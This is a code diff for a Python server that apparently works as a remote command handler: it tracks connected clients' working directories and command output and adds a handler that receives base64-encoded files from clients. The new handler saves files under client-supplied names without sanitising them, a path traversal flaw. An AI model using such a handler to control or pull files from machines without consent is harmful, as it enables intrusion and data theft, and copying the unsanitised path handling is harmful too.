@@ -276,8 +276,8 @@ def handle_client(conn, addr):
                             with clients_lock:
                                 if addr in clients:
                                     clients[addr]["cwd"] = cwd
+                                    clients[addr]["last_output"] = output
                                     clients[addr]["cmd_event"].set()
-                                    clients[addr]["cmd_output"] = output
                         
                         elif msg_type == "FILE_UPLOAD":
                             # Handle file upload from client
@@ -442,6 +442,58 @@ def handle_client(conn, addr):
                                     clients[addr]["last_output"] = output
                                     clients[addr]["cwd"] = cwd
                                     clients[addr]["cmd_event"].set()
+                        
+                        # Handle FILE_UPLOAD messages
+                        elif message.get("type") == "FILE_UPLOAD":
+                            filename = message.get("filename")
+                            file_data_b64 = message.get("data")
+                            success = message.get("success", True)
+                            error = message.get("error", None)
+                            
+                            if success and file_data_b64:
+                                try:
+                                    # Create uploads directory if it doesn't exist
+                                    upload_dir = os.path.join("logs", "uploads")
+                                    os.makedirs(upload_dir, exist_ok=True)
+                                    
+                                    # Decode and save file
+                                    file_data = base64.b64decode(file_data_b64)
+                                    save_path = os.path.join(upload_dir, filename)
+                                    
+                                    # Handle duplicate filenames
+                                    base, ext = os.path.splitext(filename)
+                                    counter = 1
+                                    while os.path.exists(save_path):
+                                        save_path = os.path.join(upload_dir, f"{base}_{counter}{ext}")
+                                        counter += 1
+                                    
+                                    with open(save_path, "wb") as f:
+                                        f.write(file_data)
+                                    
+                                    with clients_lock:
+                                        if addr in clients:
+                                            clients[addr]["file_upload_status"] = "success"
+                                            clients[addr]["uploaded_file_path"] = save_path
+                                            clients[addr]["cmd_event"].set()
+                                    
+                                    print(f"\n{GREEN}[✓] File uploaded from {client_name}: {filename} -> {save_path}{RESET}")
+                                    print(f"{RED}Server> {RESET}", end="", flush=True)
+                                except Exception as e:
+                                    with clients_lock:
+                                        if addr in clients:
+                                            clients[addr]["file_upload_status"] = "failed"
+                                            clients[addr]["file_upload_error"] = str(e)
+                                            clients[addr]["cmd_event"].set()
+                                    print(f"\n{RED}[ERROR] Failed to save uploaded file: {e}{RESET}")
+                                    print(f"{RED}Server> {RESET}", end="", flush=True)
+                            else:
+                                with clients_lock:
+                                    if addr in clients:
+                                        clients[addr]["file_upload_status"] = "failed"
+                                        clients[addr]["file_upload_error"] = error or "Unknown error"
+                                        clients[addr]["cmd_event"].set()
+                                print(f"\n{RED}[ERROR] Client reported upload error: {error}{RESET}")
+                                print(f"{RED}Server> {RESET}", end="", flush=True)
 
                     except json.JSONDecodeError:
                         pass
